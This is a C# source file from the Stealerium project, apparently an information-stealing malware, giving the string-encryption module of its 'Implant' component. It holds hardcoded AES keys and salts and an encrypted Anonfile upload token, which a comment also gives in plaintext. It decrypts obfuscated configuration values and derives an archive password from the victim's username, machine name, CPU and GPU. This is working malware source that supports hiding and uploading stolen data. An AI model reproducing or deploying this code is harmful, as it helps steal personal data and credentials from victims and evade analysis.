using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Stealerium.Target.System;

namespace Stealerium.Modules.Implant
{
    internal sealed class StringsCrypt
    {
        // Salt
        public static string ArchivePassword = GenerateRandomData();

        // byte[] SaltBytes = Encoding.Default.GetBytes("f3o3K-11=G-N7VJtozOWRr=(tNZBfK+bS7Fy");
        private static readonly byte[] SaltBytes =
        {
            102, 51, 111, 51, 75, 45, 49, 49, 61, 71, 45, 78, 55, 86, 74, 116, 111, 122, 79, 87, 82, 114, 61, 40, 116,
            78, 90, 66, 102, 75, 43, 98, 83, 55, 70, 121
        };

        // byte[] CryptKey = Encoding.Default.GetBytes(";&KF!M!h8^iT:<)a?~mXeN*~o?gN[v@rQ=B");
        private static readonly byte[] CryptKey =
        {
            59, 38, 75, 70, 33, 77, 33, 104, 56, 94, 105, 84, 58, 60, 41, 97, 63, 126, 109, 88, 101, 78, 42, 126, 111,
            63, 103, 78, 91, 118, 64, 114, 81, 61, 66
        };

        //Anonfile API key
        // byte[] CryptKey = Encoding.Default.GetBytes("?token=0429cbf2316b8e33");
        public static string AnonApiToken = Decrypt(new byte[]
        {
            240, 69, 91, 47, 188, 54, 254, 184, 162, 97, 18, 252, 143, 255, 136, 205, 102, 226, 235, 10, 49, 114, 229,
            124, 201, 6, 163, 171, 240, 62, 178, 215
        });

        // Create hash from username, pcname, cpu, gpu
        public static string GenerateRandomData(string sd = "0")
        {
            var number = sd;
            if (sd == "0")
            {
                var d = DateTime.Parse(SystemInfo.Datenow);
                number = ((DateTimeOffset) d).Ticks.ToString();
            }

            var data =
                $"{number}-{SystemInfo.Username}-{SystemInfo.Compname}-{SystemInfo.Culture}-{SystemInfo.GetCpuName()}-{SystemInfo.GetGpuName()}";
            using (var hash = MD5.Create())
            {
                return string.Join
                (
                    "",
                    from ba in hash.ComputeHash
                    (
                        Encoding.UTF8.GetBytes(data)
                    )
                    select ba.ToString("x2")
                );
            }
        }

        // Decrypt string
        public static string Decrypt(byte[] bytesToBeDecrypted)
        {
            byte[] decryptedBytes;
            using (var ms = new MemoryStream())
            {
                using (var aes = new RijndaelManaged())
                {
                    aes.KeySize = 256;
                    aes.BlockSize = 128;
                    var key = new Rfc2898DeriveBytes(CryptKey, SaltBytes, 1000);
                    aes.Key = key.GetBytes(aes.KeySize / 8);
                    aes.IV = key.GetBytes(aes.BlockSize / 8);
                    aes.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }

                    decryptedBytes = ms.ToArray();
                }
            }

            return Encoding.UTF8.GetString(decryptedBytes);
        }

        // Decrypt config values
        public static string DecryptConfig(string value)
        {
            if (string.IsNullOrEmpty(value))
                return "";
            if (!value.StartsWith("ENCRYPTED:"))
                return value;
            return Decrypt(Convert.FromBase64String(value
                .Replace("ENCRYPTED:", "")));
        }
    }
}